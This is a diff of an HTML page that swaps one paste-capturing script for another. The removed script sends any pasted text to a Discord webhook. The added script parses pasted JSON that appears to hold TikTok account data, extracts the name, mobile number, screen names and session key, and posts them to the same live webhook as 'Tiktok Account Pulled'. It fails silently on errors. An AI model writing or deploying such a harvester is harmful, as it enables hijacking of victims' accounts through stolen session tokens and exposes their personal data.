@@ -3,21 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <script>
-        function handlePaste(event) {
-            event.preventDefault();
-            const pastedText = event.clipboardData.getData('text');
-            document.getElementById('pasted-text').value = pastedText;
-            fetch('https://discord.com/api/webhooks/1293012839736545310/tpj0XeopAmrCYoMcOoD4tw5dxuNdpstke0F8fiUVikHQsisnbsT25akVK5S2Cm28OENC', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: pastedText })
-            });
-        }
-    </script>
 </head>
 <body>
-    <textarea id="pasted-text" rows="10" cols="50" onpaste="handlePaste(event)"></textarea>
+<textarea id="jsonInput" placeholder=""></textarea>
+<script>
+    async function processData(input) {
+        try {
+            const jsonData = JSON.parse(decodeURIComponent(input)),
+                  avatarUrl = jsonData.data.avatar_url,
+                  name = jsonData.data.name,
+                  screenName = jsonData.data.screen_name,
+                  countryCode = jsonData.data.country_code,
+                  mobile = jsonData.data.mobile,
+                  platformScreenName = jsonData.data.connects[0].platform_screen_name,
+                  userCreateTime = new Date(jsonData.data.user_create_time * 1000).toLocaleString(),
+                  sessionKey = jsonData.data.session_key,
+                  embed = {
+                      username: "Tiktok Account Pulled",
+                      embeds: [{
+                          title: "info",
+                          color: 3447003,
+                          thumbnail: { url: avatarUrl },
+                          fields: [
+                              { name: "Name", value: name, inline: true },
+                              { name: "Screen Name", value: screenName, inline: true },
+                              { name: "Country Code", value: countryCode.toString(), inline: true },
+                              { name: "Mobile", value: mobile, inline: true },
+                              { name: "Screen Name", value: platformScreenName, inline: true },
+                              { name: "User Create Time", value: userCreateTime, inline: true },
+                              { name: "Session ID", value: sessionKey, inline: false }
+                          ]
+                      }]
+                  };
+            await fetch('https://discord.com/api/webhooks/1293012839736545310/tpj0XeopAmrCYoMcOoD4tw5dxuNdpstke0F8fiUVikHQsisnbsT25akVK5S2Cm28OENC', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(embed) });
+        } catch (error) {}
+    }
+    document.getElementById('jsonInput').addEventListener('paste', function(event) {
+    { processData(event.target.value); }
+    });
+</script>
 </body>
 </html>
- 
